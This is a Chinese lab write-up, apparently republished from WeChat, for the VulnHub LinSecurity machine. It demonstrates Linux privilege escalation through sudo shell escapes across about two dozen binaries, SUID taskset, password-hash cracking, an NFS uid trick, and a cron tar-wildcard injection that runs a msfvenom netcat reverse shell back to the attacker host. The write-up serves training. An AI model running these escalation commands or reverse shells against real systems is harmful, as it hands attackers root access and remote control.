<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_7W5IxCykgrpQNt2b9UzpQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzX3IKicmibzcXpgMn3QSQBT65NVrKeNgxobszHgS7UvHGqeic05AYOeerg/640?wx_fmt=other&from=appmsg)  

靶机地址：https://www.vulnhub.com/entry/linsecurity-1,244/

提示信息：username:bob password:secret

学习内容：SUDO 提权 / SUID 提权 / Hash 密码破解 / NFS 服务 / Crontab 定时任务提权 / 敏感隐藏文件提权

实验环境：kalli->vmware LinSecurity->Virtualbox

步骤一：使用以下命令探索攻击目标主机并对其进行详细的扫描... 发现开放的端口比较多！

arp-scan -l   # 192.168.1.7

nmap -sS -sV -T5 -A 192.168.1.7 -p-

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzKmjb3JK73dxIjZ2BLybq1M0KMWDgsUPx4C02BPmRj1dHG8VPPNIUyA/640?wx_fmt=other&from=appmsg)

步骤二：这里直接在攻击机上使用靶机提供的用户密码信息进行 SSH 链接后操作

ssh bob@192.168.1.7

username:bob

password:secret

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzzXg4IPTENdbX1WGBQLet0LzibcnSELLUUgBn20FFARj6gyuqKnSH4yA/640?wx_fmt=other&from=appmsg)

步骤三：尝试使用 linpeas 进行 Linux 提权的信息收集.... 下载以下的项目并将文件上传到目标靶机执行查看执行结果....

# 项目地址

https://github.com/peass-ng/PEASS-ng

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzB01G7K5Ijt6HZ3DoZYJNlmVz8ffUTZGp3t5H2ZKH7K3uDq96BsWglw/640?wx_fmt=other&from=appmsg)  

一：Sudo 提权  

Sudo 权限是 Root 用户把本来只能超级用户执行的命令赋予给普通用户执行，利用 sudo -l 查看支持 root 权限的命令且能利用这些命令可以简单直接提升到 root，可以在下面的网站查看如何使用命令提权！  
查询网站：https://gtfobins.github.io/#find  
步骤一：使用 sudo -l 命令查看当前 bob 用户可以用 sudo 执行哪些命令？  

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzHmouduic5lI7rtFHhbkdCyxFiaghmSmo1yccmVZSOtnTFicO3MYQ7dK2w/640?wx_fmt=other&from=appmsg)

步骤二：开始使用以下显示的命令开始进行提权操作... 需要注意的是有的名利可以直接返回一个 root 权限的终端 但有的命令则是进入到文件编辑中 需要继续输入才能进入到高权限的终端下....！  

# 1.ash

ash（Almquist Shell）是一个轻量级、高效的 Unix/Linux 命令行解释器，常用于嵌入式系统和资源受限的环境中。

提权命令：sudo ash

# 2.awk

awk 是一个用于在 Unix/Linux 系统中进行模式匹配和文本处理的强大工具和编程语言。

提权命令：sudo awk 'BEGIN {system("/bin/sh")}'

# 3.bash

bash 是一个广泛使用的 Unix/Linux 命令行解释器和脚本语言，提供强大的交互和自动化功能。

提权命令：sudo /bin/bash

# 4.csh

csh 是一种基于 C 语言语法的 Unix 命令行解释器，提供丰富的编程功能和用户交互特性。

提权命令：sudo csh

# 5.dash

dash 是一个轻量级且符合 POSIX 标准的 Unix/Linux 命令行解释器，专为快速执行脚本而设计。

提权命令：sudo dash

# 6.ed

ed 是一个基于命令行的行编辑器，用于在 Unix 和类 Unix 系统中进行基本的文本编辑操作。

提权命令：sudo ed

提权命令：!/bin/sh

# 7.env

env 是一个用于显示或设置环境变量的命令行工具，在 Unix 和类 Unix 系统中被广泛使用。

提权命令：sudo env /bin/sh

# 8.expect

expect 是一种用于编写和执行交互式脚本的自动化工具，常用于模拟人类用户与命令行程序或脚本的交互过程。

提权命令：sudo expect -c 'spawn /bin/sh;interact'

# 9.find

find 是一个用于在文件系统中搜索文件和目录的命令行工具，支持多种搜索条件和操作。

提权命令：sudo find . -exec /bin/sh \; -quit

# 10.ftp

ftp 是一种用于在计算机之间传输文件的标准网络协议和命令行工具，支持文件传输、目录操作、权限设置等功能。

提权命令：sudo ftp

提权命令：!/bin/sh

# 11.less

less 是一个命令行文本查看器，用于分页显示文本文件内容，并支持搜索、导航等功能，适用于查看大型文本文件。

提权命令：sudo less /etc/profile

提权命令：!/bin/sh

# 12.git

git 是一个分布式版本控制系统，用于跟踪文件的更改并协调多人协作开发项目，提供了版本控制、分支管理、远程仓库等功能。

- 方式一: 这会调用默认的分页器，通常是 less，其他功能可能也适用。

提权命令：sudo git -p help config

提权命令：!/bin/sh

- 方式二：帮助系统也可以从任何 git 命令中访问，例如 git branch。这会调用默认的分页器，通常是 less，其他功能可能也适用。

提权命令：sudo git branch --help config

提权命令：!/bin/sh

- 方式三：Git 钩子仅仅是 shell 脚本，在下面的示例中，使用了与预提交动作相关联的钩子。任何其他的钩子也可以工作，只需确保能够执行适当的操作来触发它。现有的存储库也可以使用，并且进入该目录也可以，即，可以不使用 -C 选项。

提权命令：TF=$(mktemp -d)

提权命令：ln -s /bin/sh "$TF/git-x"

提权命令：sudo git "--exec-path=$TF" x

# 13.man

man 是一个命令行工具，用于查看 Unix 和类 Unix 系统中命令、函数和配置文件等的详细手册页，提供了丰富的帮助信息和文档阅读功能。

提权命令：sudo man man

提权命令：!/bin/sh

# 14.more

more 是一个命令行工具，用于逐页显示文本文件内容，支持基本的浏览和搜索操作，适用于查看较小的文本文件。

提权命令：TERM= sudo more /etc/profile

提权命令： !/bin/sh

# 15.scp

scp 是基于 SSH 协议的文件传输工具，用于在 Unix 和类 Unix 系统之间安全地传输文件，支持加密传输、远程复制、文件权限保持等功能。

提权命令：TF=$(mktemp)

提权命令：echo 'sh 0<&2 1>&2' > $TF

提权命令：chmod +x "$TF"

提权命令：sudo scp -S $TF x y:

# 16.socat

socat 是一个用于在 Unix 系统中建立双向数据流连接的网络工具，支持各种类型的连接、数据传输、代理功能等。

提权命令：sudo socat stdin exec:/bin/sh

# 17.ssh

ssh 是一种安全的远程登录和数据传输协议，提供了加密通信、身份验证、端口转发等功能，用于在计算机之间建立安全的连接和传输数据。

提权命令：sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

# 18.vi

vi 是一款在 Unix 和类 Unix 系统中常用的文本编辑器，具有模式切换、编辑操作、命令执行等功能，适用于在终端环境下进行文本编辑。

提权命令：sudo vi -c ':!/bin/sh' /dev/null

# 19.zsh

zsh 是一种功能强大的命令行解释器，具有丰富的特性和高度的可定制性，提供了智能补全、历史命令管理、多种主题样式等功能，适用于提高命令行操作效率和舒适度。

提权命令：sudo zsh

# 20.pico

pico 是一个简单易用的文本编辑器，提供了基本的编辑功能，适用于在终端环境下进行简单的文本编辑任务。

提权命令：sudo pico

提权命令：^R^X

提权命令：reset; sh 1>&0 2>&0

# 21.rvim

rvim 可能是 Vim 编辑器的简化版本，提供了简化的功能和基本的编辑功能，适用于初学者或需要快速编辑文件的场景。

- 方式一：This requires that rvim is compiled with Python support. Prepend :py3 for Python 3.

sudo rvim -c ':py import os; os.execl("/bin/sh","sh","-c","reset; exec sh")'

- 方式二：his requires that rvim is compiled with Lua support.

sudo rvim -c ':lua os.execute("reset; exec sh")'

# 22.perl

Perl 是一种通用的脚本编程语言，具有强大的文本处理能力和广泛的应用领域，适用于各种编程任务和场景。

提权命令：sudo perl -e 'exec"/bin/sh";'

# 23.tclsh

tclsh 是 Tcl 的解释器，提供了一个交互式的环境，用于执行 Tcl 语句和脚本。

提权命令：sudo tclsh

提权命令：exec /bin/sh <@stdin>@stdout 2>@stderr

# 24.script

script 命令用于记录和保存当前终端会话的所有输入和输出内容到一个文件中。

提权命令：sudo script -q /dev/null

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxz3a3GDVGia5kA9klfWIib4P5iauibeUZoDpdkeCRNSS07fXic8W2og2ACicBQ/640?wx_fmt=other&from=appmsg)

二：Suid 提权  
Suid 权限是 Uid+s 的组合，其中 s 是特殊权限并且在一般默认下用户权限是 3 位，例如 0777 而特殊权限默认不配置，如果超级管理员希望用户执行特殊权限文件时，拥有 root 权限就会配置 s 的特殊权限。需要说明时 SUID 权限既可以用来提权也可以用来维持权限！  
步骤一：使用 find 命令去查询具有特殊权限的执行文件... 尝试用来进行 SUID 提权！  

find / -perm -4000 2>/dev/null

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

find / -perm -u=s -type f -exec ls -al {} \; 2>/dev/null

-perm 匹配权限，4000 是 suid 程序执行时，如果该程序有 suid 权限，会变成程序文件的属主 2000 是 sgid 而 1000 是 sbit 且 2>/dev/null 是将错误输出到黑洞中

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzrvlpHkZuvn53INjXu76R12wPupyibXUlQsF7QVZwWMhr329Gd3n9Nlw/640?wx_fmt=other&from=appmsg)

步骤二：目前已知道可用来 SUID 提权的的命令有 nmap/vim/find/bash/more/less/nano/cp 等... 其中发现 /usr/bin/taskset 具备 SUID 权限尝试提权...  

# taskset

‌taskset 命令是一个用于设置进程或线程运行在指定 CPU 核心的工具，它允许用户或系统管理员精细控制进程的 CPU 亲和性，即哪些 CPU 核可以被特定进程使用。

# 执行命令

taskset 1 /bin/sh -p

taskset 1 /bin/bash -p

# 帮助信息

https://gtfobins.github.io/gtfobins/taskset/#suid-enabled

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzYf5BnhYQkV4kGzN7SYAhRhibqrNkwaJvIdDaQuic3UVtSDQQ2icz4nurg/640?wx_fmt=other&from=appmsg)

三：Hash 密码破解  
步骤一：这里读取 / etc/passwd 与 / etc/shadow 文件来查看是否存在明文密码加密值可以使用 john 和 hashcat 来进行密码破解... 这里发现高权限用户 insecurity 的密码加密值... 实际情况中也很有可能时其他攻击者留下的后门账号...  
insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzibic2CARISfqO6EWQAOzDkfsFEqBw3EXsibibhGk3tOeflLcxhVqrR9ialA/640?wx_fmt=other&from=appmsg)

  
步骤二：这里需要对 / etc/passwd 与 / etc/shadow 文件内容做解释.... 如下！  

# /etc/passwd

insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh

用户名：密码：UID（用户 ID）：GID（组 ID）：描述性信息：主目录：默认 Shell

"x" 表示此用户设有密码，但不是真正的密码，真正的密码保存在 /etc/shadow 文件中

UID 范围：0 为超级用户。1-499 为系统用户，1~99 用于系统自行创建的账号；100~499 分配给有系统账号需求的用户。500-65535 为普通用户

# /etc/shadow

root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1:17721:0:99999:7:::

1、root 记录用户名, 以：号分隔

2、$6$ 开头的是 SHA-512 加密的，$1$ 是 MD5,$2$ 是 Blowfish 加密，$5$ 是 SHA-256，如果是空，则没有口令，* 号代表被锁定，！！表示密码过期

3、最后一次修改时间表示从某个时刻起，到用户最后一次修改口令的天数，17721 天

4、最小时间间隔，指两次修改口令之间所需的最小天数，0

5、最大时间间隔，口令保持有效的最大天数，99999

6、警告时间，从系统开始警告用户到用户密码失效之间的天数，7

7、不活动时间，用户没有登录活动但账号仍然能保持有效的最大天数

8、失效天数

9、保留字段，没有啥意义

  
步骤三：将 Hash 值输出重定向到 pass.hash 文件中并使用 john 解密获取其账号密码信息 insecurity/P@ssw0rd  

echo 'AzER3pBZh6WZE' > pass.hash

cat pass.hash

gunzip /usr/share/wordlists/rockyou.txt.gz

john pass.hash -w=/usr/share/wordlists/rockyou.txt

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzBZLto4DFgicangnfl97tERkKEZV9uEN0S55UBA8PrsFmAicud0ia9zMeQ/640?wx_fmt=other&from=appmsg)

步骤四：同样的我们可以使用 hashcat 进行解密也能获取其密码值...  
hashcat AzER3pBZh6WZE -m 1500 /usr/share/wordlists/rockyou.txt

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzBYFbnWJBhAFgWGl4Xo3AeyJgYJRR27osTaYmGOvic45TvnLcibLeZl1Q/640?wx_fmt=other&from=appmsg)

  
四：Crontab 计划任务  
步骤一：使用 cat /etc/crontab 查看计划任务后发现可以进行编辑... 这里使用 MSF 生成一个能够对 netcat 反弹 shell 的命令并在攻击机上对 8888 端口进行监听...  

# 攻击机执行命令

msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.6 lport=8888 R

# 获取到的攻击代码

mkfifo /tmp/oyiot; nc 192.168.1.6 8888 0</tmp/oyiot | /bin/sh>/tmp/oyiot 2>&1; rm /tmp/oyiot

# 攻击机执行命令

nc -lvvp 8888

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzdp7S0qIcUehXWqPRrCIOia6f1uic1jKkqh7GiaZKzyuPktJmm8kCKyjbQ/640?wx_fmt=other&from=appmsg)

步骤二：在目标上写入计划任务信息并等待一段时间后就能够获取反弹过来的 Shell...  

echo "mkfifo /tmp/oyiot; nc 192.168.1.6 8888 0</tmp/oyiot | /bin/sh>/tmp/oyiot 2>&1; rm /tmp/oyiot" > shell.sh && chmod +x shell.sh

echo > "--checkpoint-action=exec=sh shell.sh"

echo > "--checkpoint=1"

#--checkpoint-action 选项：用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzVB31q1daMzQ2ExRGDZwBCMI6Pwj8neXvINtQgD89av1eyCkSIJNyWQ/640?wx_fmt=other&from=appmsg)

步骤三：获取反弹的 Shell 为高权限即提权成功！....  

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzXVtzWVS44WgX9ZTSmX3HbF9SJtAg2l8jn4NpBEzKAMdN9eE7EGNCyg/640?wx_fmt=other&from=appmsg)

  
五：敏感隐藏文件  
步骤一：在获得普通用户权限后，我们需要找一下有没有其他用户的隐藏信息并在隐藏信息前面带. 一般不使用 ls -la 看不到，其他用户放在 / home 文件夹并输入 ls -laR /home 或者利用 find 命令  

# 执行命令

find / -name ".*" -type f -path "/home/*" -exec ls -al {} \; 2>/dev/null

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzURLJua9TpSy5lmHQ6zz9ckGQ2Qy00lvDjWBKhrsGVnS00jgPr582CQ/640?wx_fmt=other&from=appmsg)

步骤二：找到了另一个用户 susan，密码：MySuperS3cretValue！不在该用户的基础上做提权动作...  
六：NFS 服务提权  
步骤一：NFS 服务低权限访问其服务允许计算机之间通过 Tcp/Ip 网络共享资源，之前在使用 nmap 时查看到存在 2049 端口 NFS 服务，执行以下命令尝试访问其 NSF 服务并挂载到本地的目录上...  

showmount -e 192.168.1.7   # 查看 NFS 服务

mkdir peter                #本地创建目录

mount 192.168.1.7:/home/peter /root/peter  #将 NFS 目录挂载到本地文件夹中

cd peter                   # 进入目录

ls -a                      #查看目录内容

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzia2xH5Mn5NAJMlkK4x7uiaZn0Ljen4vWO4jwtYUl586j4lTBUe8jfBSQ/640?wx_fmt=other&from=appmsg)

步骤二：在 Kali 上挂载 NFS 共享后创建一个 gid 为 1005 的用户组，接着创建 peter 这个账户 uid 指定为 1001，gid 指定为 1005 其中设置账户的密码为 123  

groupadd -g 1005 peter

adduser peter -uid 1001 -gid 1005

su peter

id 

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzo723oNPAYoiaJvuicFGTTk7LEbxMKh0zEZtx8ZNvORbZHlbL3Un8Wmng/640?wx_fmt=other&from=appmsg)

步骤三：在 kali 上生成 ssh 公私钥对，创建. ssh 目录，传输公钥，设置权限，最后连接  

# 执行命令

cd /home/xhonger/Vuln/LinSecurity/peter

ssh-keygen -t rsa

cd /home/xhonger/Vuln/LinSecurity/peter/.ssh

cat /home/peter/.ssh/id_rsa.pub

cat /home/peter/.ssh/id_rsa.pub > authorized_keys

cd ..

chmod 700 .ssh

cd .ssh

chmod 600 authorized_keys

ssh peter@192.168.1.7

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxzf7M6SYS84icLvJ9WOXpeb57rb9yaic0FfnlOqje9CLJhhvo1m5ngP0UQ/640?wx_fmt=other&from=appmsg)

步骤四：执行 sudo -l 发现 strace 具备 sudo 权限即可进行权限提升！拿下 Root 权限

# 提权命令

sudo strace -o /dev/null /bin/sh

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZfZ67TDZanb0ibLxv7cTYBxz2UM2tJJiaEQf2x57icWOBROPQS6I3tuXJicoTwc3Gv788amDDgw2FUmag/640?wx_fmt=other&from=appmsg)

  
参考文章：  

https://blog.csdn.net/weixin_43938645/article/details/129757892

https://blog.csdn.net/qq_51886509/article/details/139564340

https://blog.csdn.net/qq_36119192/article/details/84872644

https://blog.51cto.com/u_5139878/5406981

https://juejin.cn/post/7326979270882754610

Markdown

复制代码

https://blog.csdn.net/weixin_43938645/article/details/129757892

https://blog.csdn.net/qq_51886509/article/details/139564340

https://blog.csdn.net/qq_36119192/article/details/84872644

https://blog.51cto.com/u_5139878/5406981

https://juejin.cn/post/7326979270882754610

之前以及后续批量脚本放置纷传统一管理（工作日稳定更新）

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4Ze2aR7g4VH7IuVNrj0auPMzvv9B5iccrTnOzSIX5iaEiatDiahTZiaSQZFBuwUZjwMEynkbficQDV6EeM8g/640?wx_fmt=png&from=appmsg)

51 入圈限时优惠（详情请后台联系）  

```
https://pc.fenchuan8.com/#/index?forum=78511&coupon=29287324c16155cedf87b8e68f368c40&yqm=FNM6Y

```